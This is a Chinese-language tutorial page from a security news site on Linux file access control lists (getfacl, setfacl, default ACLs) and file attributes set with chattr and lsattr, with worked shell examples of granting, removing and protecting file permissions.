<p style="text-align: left;">ACL 全称 Access Control Lists 翻译成中文叫”访问控制列表”,传统的 Linux 文件系统的权限控制是通过 user、group、other 与 r(读)、w(写)、x(执行) 的不同组合来实现的。随着应用的发展，这些权限组合已不能适应现时复杂的文件系统权限控制要求。 例如，目录 /data 的权限为：drwxr-x—，所有者与所属组均为 root，在不改变所有者的前提下，要求用户 tom 对该目录有完全访问权限 (rwx).考虑以下2种办法 (这里假设 tom 不属于 root group)<br style="outline: none;"/>(1) 给 /data 的 other 类别增加 rwx permission，这样由于 tom 会被归为 other 类别，那么他也将拥有 rwx 权限。<br style="outline: none;"/>(2) 将 tom 加入到 root group，为 root group 分配 rwx 权限，那么他也将拥有 rwx 权限。<br style="outline: none;"/>以上 2 种方法其实都不合适<br style="outline: none;"/>为了解决这些问题，Linux 开发出了一套新的文件系统权限管理方法，叫文件访问控制列表 (Access Control Lists, ACL)。简单地来说，ACL 就是可以设置特定用户或者用户组对于一个文件的操作权限。<br style="outline: none;"/>文件的所有者以及有CAP_FOWNER的用户进程可以设置一个文件的acl。（在目前的linux系统上，root用户是唯一有CAP_FOWNER能力的用户）<br style="outline: none;"/>ACL 有两种:</p>
<p style="text-align: left;">access ACL</p>
<p style="text-align: left;">针对文件和目录设置访问控制列表。</p>
<p style="text-align: left;">一种是default ACL，只能针对目录设置。如果目录中的文件没有设置 ACL，它就会使用该目录的默认 ACL.<br style="outline: none;"/>1）getfacl<br style="outline: none;"/>获取文件权限</p>
<pre class="brush:html;toolbar:false;">[root@vincent&nbsp;tmp]#&nbsp;getfacl&nbsp;1.cap
#&nbsp;file:&nbsp;1.cap
#&nbsp;owner:&nbsp;root
#&nbsp;group:&nbsp;root
user::rw-
group::r--
other::r--</pre>
<p style="text-align: left;">2）setfacl<br style="outline: none;"/>Access ACL<br style="outline: none;"/>比如我设置/tmp/1.sh的other权限为000，然后切换到vinc账户。</p>
<pre class="brush:html;toolbar:false;">[vinc@vincent&nbsp;tmp]$&nbsp;cat&nbsp;1.sh
cat:&nbsp;1.sh:&nbsp;权限不够</pre>
<p style="text-align: left;">然后我们添加ACL</p>
<pre class="brush:html;toolbar:false;">[root@vincent&nbsp;opt]#&nbsp;setfacl&nbsp;-m&nbsp;u:vinc:rwx&nbsp;/tmp/1.sh</pre>
<p style="text-align: left;">然后我们使用ll查看，发现第一个字段文件权限第十位变成了+号</p>
<pre class="brush:html;toolbar:false;">[root@vincent&nbsp;tmp]#&nbsp;ll&nbsp;1.sh
-rwxrwx---+&nbsp;1&nbsp;root&nbsp;root&nbsp;512&nbsp;8月&nbsp;&nbsp;&nbsp;9&nbsp;03:21&nbsp;1.sh</pre>
<p style="text-align: left;">然后我们使用getfacl查看</p>
<pre class="brush:html;toolbar:false;">[vinc@vincent&nbsp;tmp]$&nbsp;getfacl&nbsp;1.sh
#&nbsp;file:&nbsp;1.sh
#&nbsp;owner:&nbsp;root
#&nbsp;group:&nbsp;root
user::rwx
user:vinc:rwx
group::r-x
mask::rwx
other::---</pre>
<p style="text-align: left;">我们切换到vinc账户就可以查看内容了</p>
<pre class="brush:html;toolbar:false;">[vinc@vincent&nbsp;tmp]$&nbsp;cat&nbsp;1.sh
test</pre>
<p style="text-align: left;">删除这条ACL</p>
<pre class="brush:html;toolbar:false;">[root@vincent&nbsp;tmp]#&nbsp;setfacl&nbsp;-x&nbsp;u:vinc&nbsp;/tmp/1.sh</pre>
<p style="text-align: left;">取消所有的ACL</p>
<pre class="brush:html;toolbar:false;">[root@vincent&nbsp;tmp]#&nbsp;setfacl&nbsp;-b&nbsp;/tmp/1.sh</pre>
<p style="text-align: left;">Default ACl</p>
<p style="text-align: left;">前面所说都是access acl，针对文件而言，而default acl是指对于一个目录进行default acl设置，并且在此目录下建立的文件都将继承此目录的acl。</p>
<pre class="brush:html;toolbar:false;">[root@vincent&nbsp;opt]#&nbsp;setfacl&nbsp;-d&nbsp;-m&nbsp;u:hehe:---&nbsp;1</pre>
<p style="text-align: left;">来看下目录1的权限</p>
<pre class="brush:html;toolbar:false;">[root@vincent&nbsp;opt]#&nbsp;getfacl&nbsp;-c&nbsp;1
user::rwx
group::r-x
other::r-x
default:user::rwx
default:user:hehe:---
default:group::r-x
default:mask::r-x
default:other::r-x</pre>
<p style="text-align: left;">我们在目录1下新建的文件都将继承这个权限。我们在目录1下新建一个文件，然后查看一下ACL</p>
<pre class="brush:html;toolbar:false;">[vinc@vincent&nbsp;1]$&nbsp;getfacl&nbsp;222
#&nbsp;file:&nbsp;222
#&nbsp;owner:&nbsp;vinc
#&nbsp;group:&nbsp;vinc
user::rw-
user:hehe:---
group::r-x&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#effective:r--
mask::r--
other::r--</pre>
<p style="text-align: left;">切换到hehe账户，查看文件，提示权限不够。</p>
<pre class="brush:html;toolbar:false;">[hehe@vincent&nbsp;1]$&nbsp;cat&nbsp;/opt/1/222
cat:&nbsp;/opt/1/222:&nbsp;权限不够</pre>
<p><strong>lsattr和chattr</strong></p>
<p>chattr</p>
<p style="text-align: left;">修改属性能够提高系统的安全 性，但是它并不适合所有的目录。chattr命令不能保护/、/dev、/tmp、/var目录<br style="outline: none;"/>a：即append，设定该参数后，只能向文件中添加数据，而不能删除，多用于服务器日志文件安全，只有root才能设定这个属性。<br style="outline: none;"/>i：设定文件不能被删除、改名、设定链接关系，同时不能写入或新增内容。i参数对于文件 系统的安全设置有很大帮助。<br style="outline: none;"/>s：保密性地删除文件或目录，即硬盘空间被全部收回。<br style="outline: none;"/>u：与s相反，当设定为u时，数据内容其实还存在磁盘中，可以用于undeletion。<br style="outline: none;"/>例子：<br style="outline: none;"/>设置/etc/resolv.conf为不可修改</p>
<pre class="brush:html;toolbar:false;">[root@vincent&nbsp;tmp]#&nbsp;chattr&nbsp;+i&nbsp;/etc/resolv.conf&nbsp;
[root@vincent&nbsp;tmp]#&nbsp;lsattr&nbsp;/etc/resolv.conf&nbsp;
----i--------e-&nbsp;/etc/resolv.conf
[root@vincent&nbsp;tmp]#&nbsp;echo&nbsp;&quot;&quot;&nbsp;&gt;&nbsp;/etc/resolv.conf&nbsp;
-bash:&nbsp;/etc/resolv.conf:&nbsp;权限不够</pre>
<p style="text-align: left;">lsattr</p>
<p style="text-align: left;">查看文件权限</p>
<pre class="brush:html;toolbar:false;">[root@vincent&nbsp;tmp]#&nbsp;lsattr&nbsp;1.txt&nbsp;
-----a-------e-&nbsp;1.txt</pre>
<p>本文转载自先知社区，原文链接：<a href="https://xianzhi.aliyun.com/forum/read/2150.html" target="_blank">https://xianzhi.aliyun.com/forum/read/2150.html</a></p>
                <div class="foot_description" style="background-color: #fff;">
                    如若转载，请注明原文地址：                        <a href="http://www.4hou.com/system/7899.html" target=_blank>http://www.4hou.com/system/7899.html</a>
                                    </div>


                 </p>
            </div>
            <div class="article_con">
                <!--文章内容-->
            </div>
            <div class="post-like">
                <a href="javascript:;" data-action="ding" target=_blank data-id="7899" class="favorite">
                <div class="zanbox">
                    <dd class="zanbefor"></dd>
                    <dd class="zanafter"></dd>
                </div>
                <span class="zantext">点赞</span>
                <span class="count">
            4</span>
                </a>
            </div>
            <div class="active_bottom">
                <ul>
                    <a class="Sina" href="http://service.weibo.com/share/share.php?url=http://www.4hou.com/system/7899.html" title="分享到新浪微博" target="_blank"><li class="sinahover"></li></a>
                    <a onclick="window.open('http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url='+encodeURIComponent(document.location.href));return false;" title="分享到QQ空间" class="WeChat" href="javascript:void(0)" target="_blank"><li class="kj"></li></a>
                    <a onclick="dashangToggle()" class="friend" title="分享到微信、朋友圈等" target="_blank"><li class="wx"></li></a>

                </ul>
                <div class="strat icons"><span class='wpfp-span'><img src='http://img.4hou.com/wp-content/plugins/wp-favorite-posts/img/star.png' alt='Favorite' title='Favorite' class='wpfp-img' /><a class='wpfp-link' href='?wpfpaction=add&amp;postid=7899' title='收藏' rel='nofollow'>收藏</a></span></div>
                <div class="hide_box"></div>
                <div class="shang_box">
                    <a class="shang_close" href="javascript:void(0)" onClick="dashangToggle()" title="关闭"><img src="http://img.4hou.com/wp-content/themes/4houv2/images/close.jpg" alt="取消" /></a>
                    <img class="shang_logo" width="120px" src="http://img.4hou.com/wp-content/themes/4houv2/images/logo.png" alt="嘶吼" />
                    <div class="shang_tit">
                        <p>感谢您的支持，我会继续努力的!</p>
                    </div>
                    <div class="shang_payimg">
                        <img src="http://www.4hou.com/wp-content/themes/4houv2/qrcode.php?url=http%3A%2F%2Fwww.4hou.com%2Fsystem%2F7899.html" alt="扫码支持" title="扫一扫" />
                    </div>

                    <div class="shang_info">
                        <p>打开<span id="shang_pay_txt">微信</span>扫一扫后点击右上角即可分享哟</p>
                    </div>
                </div>
            </div>
            
            <div class="avatarbottomwrap">
                 <div class="avatarboxleft">
                        <div class="avatarbottom">
                           
                            <a class="upload-img"><img alt='lujiang' src='http://img.4hou.com/wp-content/uploads/2017/06/4255a2f42cdedce6cde0-96x96.jpg' class='avatar avatar-96 photo' height='96' width='96' /></a>
                        </div>
                        <h1 class="authornamebottom"><a href="http://www.4hou.com/member?Author=lujiang" class="upload-img" target=_blank>
                                lujiang                                                            <i class="mem_level"></i>
                             </a></h1>
                        <p class="authorzybottom">嘶吼资讯编辑</p>

                        <div class="authorbottombox">
                            <!--<div class="gzbtn">关注</div>
                            <div class="sxbtn">私信</div>-->
                                                            <span class="gzbtn"  style="cursor: pointer;" onclick="location.href='/mybox?action=reply&to_user=lujiang&type=send'">发私信</span>
                                                    </div>
                 </div>
                <div class="authorother">
                 <a class="morearticle" href="http://www.4hou.com/member?Author=lujiang" class="upload-img" target=_blank>
                            <span class="swiper-pagination-bullet swiper-pagination-bullet-active"></span>
                            <span class="swiper-pagination-bullet swiper-pagination-bullet-active"></span>
                            <span class="swiper-pagination-bullet swiper-pagination-bullet-active"></span>
                             </a>
                    <div class="swiper-container">

                                                    <div class="swiper-wrapper">
                               
                                <div class="swiper-slide">
                                                                        <div><a href="http://www.4hou.com/system/7899.html" target=_blank>
                                            <img data-original="http://img.4hou.com/wp-content/uploads/2017/10/8e8bee5d0d25a5656745.jpg?imageView2/1/w/140/h/104/format/png"  class="wp-post-image"width="140" height="104"  />                                        </a></div>
                                                                        <div><a href="http://www.4hou.com/info/news/7621.html" target=_blank>
                                            <img data-original="/uploads/20170912/1505208668911359.jpeg?imageView2/1/w/140/h/104/format/png"  class="wp-post-image"width="140" height="104"  />                                        </a></div>
                                                                        <div><a href="http://www.4hou.com/info/news/7206.html" target=_blank>
                                            <img data-original="http://img.4hou.com/wp-content/uploads/2017/08/0b9b488ca11f290b61c6.png?imageView2/1/w/140/h/104/format/png"  class="wp-post-image"width="140" height="104"  />                                        </a></div>
                                                                        <div><a href="http://www.4hou.com/info/news/6327.html" target=_blank>
                                            <img data-original="http://img.4hou.com/wp-content/uploads/2017/07/6e4f663a5433df33f0c6.png?imageView2/1/w/140/h/104/format/png"  class="wp-post-image"width="140" height="104"  />                                        </a></div>
                                                                    </div>
                            </div>
                                        </div>
                </div>
                <script type="text/javascript">
                    function dashangToggle(){
                        $(".hide_box").fadeToggle();
                        $(".shang_box").fadeToggle();
                    }
                </script>
                <script> 
                    var mySwiper = new Swiper('.swiper-container', {
                        direction : 'vertical',
                        pagination : '.swiper-pagination',
                        paginationClickable :true,
                        spaceBetween : 20
                    })
                </script>
            </div>
                            <div class="review" style="margin-bottom:80px;">
    <h3 id="reply-title" class="comment-reply-title">发表评论 <small></h3>
    <form action="http://www.4hou.com/wp-comments-post.php" method="post" id="commentform">
        <p class="commentname"><label for="author">昵称</label>
            <input type="text" name="author" id="author" value="" size="14" tabindex="1" aria-required='true' placeholder = "请输入昵称" required />
        </p>
        <p class="commenteml">
            <label for="email">邮箱</label>
            <input type="text" name="email" id="email" value="" size="25" tabindex="2" aria-required='true' placeholder = "请输入邮箱地址" required />
        </p>
        <p class="comment-form-comment">
           <label for="comment">评论</label>
           <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" aria-required="true" required="required"></textarea>
        </p>

        <p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="发表评论" />
        <input type='hidden' name='comment_post_ID' value="7899" id='comment_post_ID' />
            <input type='hidden' name='comment_parent' id='comment_parent' value='0' />
        </p>
    </form>
					
<div class="new-review">
   <ol class="commentlist">
      </ol>
   <div class="hr clearfix">&nbsp;</div>
</div>
</div>             
        </article>

        <!--作者其他文章-->
        <aside class="article_authorbox">
          <div class="article_authorbox_top">
                <div class="article_author">
            <div class="article_author_avatar">
                 <a class="upload-img"><img alt='lujiang' src='http://img.4hou.com/wp-content/uploads/2017/06/4255a2f42cdedce6cde0-96x96.jpg' class='avatar avatar-96 photo' height='96' width='96' /></a>
            </div>
            <h1 class="article_author_name"><a href="http://www.4hou.com/member?Author=lujiang" class="upload-img" target=_blank>
                    lujiang                                    <i class="mem_level"></i>
                </a></h1>
            <p class="article_author_type">嘶吼资讯编辑 </p>
            <div class="article_author_bottom">
                                        <span class="send-info" onclick="location.href='/mybox?action=reply&to_user=lujiang&type=send'">发私信</span>
                         
            </div>
          </div>  
            <div class="interested">
                <h1>可能喜欢</h1>
                                                    <li>
                    <i></i>
                    <a href="http://www.4hou.com/system/7938.html" target="_blank">Authenticode签名伪造——针对文件类型的签名伪造</a> 
                </li> 
                                <li>
                    <i></i>
                    <a href="http://www.4hou.com/business/7974.html" target="_blank">爱奇艺业务安全风控体系的建设实践</a> 
                </li> 
                                <li>
                    <i></i>
                    <a href="http://www.4hou.com/tools/7968.html" target="_blank">如何使用Sysmon寻找带宏的Word恶意文档</a> 
                </li> 
                                <li>
                    <i></i>
                    <a href="http://www.4hou.com/info/news/7946.html" target="_blank">新思科技评估IPhone X Face ID及生物识别系统的安全性</a> 
                </li> 
                                <li>
                    <i></i>
                    <a href="http://www.4hou.com/info/news/7969.html" target="_blank">“中国菜刀”出海：有人用它从澳大利亚军方偷了30GB绝密数据</a> 
                </li> 
                                                </div>
       </div>

          
        </aside>
    </section>
    <div id="zooming">
        <img src="" id="imgcon">
    </div>
    <script>
        $(document).ready(function() {
            $.fn.postLike = function() {
                if ($(this).hasClass('done')) {
                    return false;
                } else {
                    $(this).addClass('done');
                    var id = $(this).data("id"),
                        action = $(this).data('action'),
                        rateHolder = $(this).children('.count');
                    var ajax_data = {
                        action: "bigfa_like",
                        um_id: id,
                        um_action: action
                    };
                    $.post("/wp-admin/admin-ajax.php", ajax_data,
                        function(data) {
                            $(rateHolder).html(data);
                        });
                    return false;
                }
            };
            $(document).on("click", ".favorite",
                function() {
                    $(this).postLike();
                });


            $("img").attr("title","");
            var altcon=$(".art_title").text();
            $("img").attr("alt",altcon);
            // 图片放大
            $(".article_cen").find('img').on("click",function(){
                var imgsrc=$(this).attr("src");
                var winthimg=$(this).width();
                var zooming=winthimg*1.2;
                $("#imgcon").css({width:zooming});
                $("#imgcon").css({marginLeft:-zooming/2});
                $("#imgcon").attr("src",imgsrc);
                $("#zooming").addClass("zoomaniatae");
                $("#imgcon").addClass("imgconadimate");
            });
            $("#zooming").on("click",function(){
                $("#imgcon").removeClass("imgconadimate");
                $("#zooming").removeClass("zoomaniatae");

            });

            $(window).scroll(function(){
                var scrtop=$(window).scrollTop();
                if(scrtop>450){
                    $(".article_authorbox_top").removeClass("asideanimateleave").addClass('asideanimate')
                    // $(".interested").hide()
                }
                else if(scrtop<450&&scrtop>350){
                     $(".article_authorbox_top").addClass("asideanimateleave").removeClass('asideanimate')
                     $(".interested").show()

                }
            });
            var start=$(".strat .wpfp-span .wpfp-link").text()
            if(start=="已收藏"){
                $(".strat").addClass("stratend")
            }else{
                $(".strat").removeClass("stratend")
            }

            $(".avatar-96").width(72);
            $(".avatar-96").height(72);
            $(".avatar-120").width(50);
            $(".avatar-120").height(50);

        });
    </script>
<style type="text/css">
.footer{height:auto; background-color: #282828}
.footer_about{width: 1200px;height: 50px;padding-top: 26px; margin: 0 auto;border-bottom-color: transparent !important; position: relative;}
.footer_about>a{font-size: 16px;height: 16px !important;line-height: 16px !important; float: left; padding-right: 18px; border-right:1px solid #ccc;}
.last-child-a{border:none !important}
.footer_bottom_cen p{ margin-top: 5px; margin-right: 25px;text-align: left; margin-bottom: 6px;float: left;}
.footer_bottom_cen>div{width: 450px;float: left;margin-right: 8px}
.footer_bottom{height: 74px}
.footerlogos{width: 130px; height: 24px; position: absolute;right: 10%; top:24px;}
.footerlogos dd{float: left; margin-right: 20px;cursor: pointer;}
.footerlogos dd a{display: block;width: 100%; height: 100%}
.wechartlogo{width: 20px; height: 20px; background-position:-227px 0px;}
.weibologo{width: 20px; height: 20px; background-position:-269px 0px;}
.zhihulogo{width: 20px; height: 20px; background-position:-361px 0px;}
.wechartlogo i{width: 80px;height: 78px;background-size: contain !important; right: 137px;display: none;opacity: 1;background: url(http://www.4hou.com/wp-content/themes/4houv2/img/wechatqr.png) no-repeat;position: absolute;top: -28px;}
.wechartlogo:hover i{display: block;}
.footer_bottom{width: 1200px; background-color: #282828; margin:0 auto } 
.footer_bottom_cen>div img{float: left; margin-right: 4px;margin-top: 4px; margin-left: 4px;width: 66px;}
.footer_bottom_cen{width: 100%}
.cloudserver{float: right !important; margin: 0 auto !important;width: 385px !important; margin-top: -31px}
.cloudserver img{float: left;}
.cloudserver dd{float: left;}
@media screen and (max-width:1260px) {
    .footer{width: 100%; padding: 0px 20px;}
    .footer_about{width: 100%}
    .footer_bottom{width: 100%}
    .footer_bottom div{width: 100%;display: none;}
}
@media screen and (max-width:660px) {
    .footer_about{padding-top: 14px; margin-bottom: 22px;}
    .footerlogos{display: none;}
    .footer_bottom{height: 44px;}

}
</style>
<footer class="footer">
    <div class="footer_about">
        <a href="/about" target=_blank>关于我们</a>
        <!--<a href="">加入我们</a>-->
        <a href="/submit" target=_blank>我要投稿</a>
        <a href="/service" target=_blank>广告及服务</a>
        <a href="/partner" target=_blank class="last-child-a">友情链接</a>
        <div class="footerlogos">
                <dd class="wechartlogo icons">
                  <i></i>
                </dd>
                <dd class="weibologo icons">
                 <a href="http://weibo.com/u/6069423878" target=_blank></a>
                </dd>
                <dd class="zhihulogo icons">
                    <a href="https://zhuanlan.zhihu.com/roartalk" target=_blank></a>
                    
                </dd>
        </div>
    </div>

    <section class="footer_bottom">
        <article class="footer_bottom_cen">
            <p>©2017 北京嘶吼文化传媒有限公司&nbsp;&nbsp;&nbsp;京ICP备16063439号</p>
            <p class="mobilefooter">©2017 北京嘶吼文化传媒有限公司&nbsp;&nbsp;|&nbsp;&nbsp;京ICP备16063439号</p>
            <div class="cloudserver">
                <span>本站由</span>
                <img src="http://img.4hou.com/wp-content/themes/4houv2/img/bdcloud.png">
                <img src="http://img.4hou.com/wp-content/themes/4houv2/img/bdcloud1.png">
                <img src="http://img.4hou.com/wp-content/themes/4houv2/img/ucloud.png">
                <span>提供云计算服务</span>
            </div>
        </article>
    </section>
    <section class="footer_top" style="display:none">
        <article class="footer_top_cen">
            <div class="homeqrcode">
                <dd class="icons"></dd>
                <div class="wb">
                    <a href="http://weibo.com/u/6069423878" target=_blank>
                    <i class="icons"></i>
                    <p>关注嘶吼传媒</p>
                    </a>
                </div>

                <div class="sh">
                    <a href="https://zhuanlan.zhihu.com/roartalk" target=_blank>
                    <i class="icons"></i>
                    <p>关注嘶吼</p>
                    </a>
                </div>
            </div>
            
            <h1>合作伙伴</h1>
            <div class="footer_friend">
                <a href="http://www.xinhuanet.com/talking/chinasafety/" target=_blank>新华网安全中国</a>
                <a href="http://jaq.alibaba.com/" target=_blank>阿里聚安全</a>
                <a href="http://www.seclover.com/" target=_blank>四叶草安全</a>
                <a href="https://sec.vip.com/" target=_blank>唯品会安全应急响应中心</a>
                <a href="https://www.duoyinsu.com/" target=_blank>安识科技</a>
                <a href="http://xianzhi.aliyun.com" target=_blank>云盾先知</a>
                <a href="http://www.ardsec.com/" target=_blank>兴华永恒</a>
                <a href="https://www.sobug.com/" target=_blank>SOBUG</a>
            </div>
        </article>
    </section>
    
</footer>
<aside class="side" >
    <div class="side_top icons "></div>
    <div class="iconbox">
        <div class="side_wechart icons iconhover">微信
            <dd></dd>
        </div>
        <a href="http://weibo.com/u/6069423878" target=_blank><div class="side_webo icons iconhover">微博</div></a>
        <a href="http://www.4hou.com/feed/" target=_blank><div class="side_rss icons iconhover">RSS</div></a>
        <a href="https://zhuanlan.zhihu.com/roartalk" target=_blank><div class="side_zh icons iconhover">知乎</div></a>
    </div>
    <div class="side_bottom icons"></div>
    
</aside>

<script>
    var _hmt = _hmt || [];
    (function() {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?ac201c14c3d2a4747423252be421e1bc";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>

<script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-91554508-1', 'auto');
    ga('send', 'pageview');

</script>
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
<script type="text/javascript"  src="//idm-su.baidu.com/su.js"></script>
</body>
</html>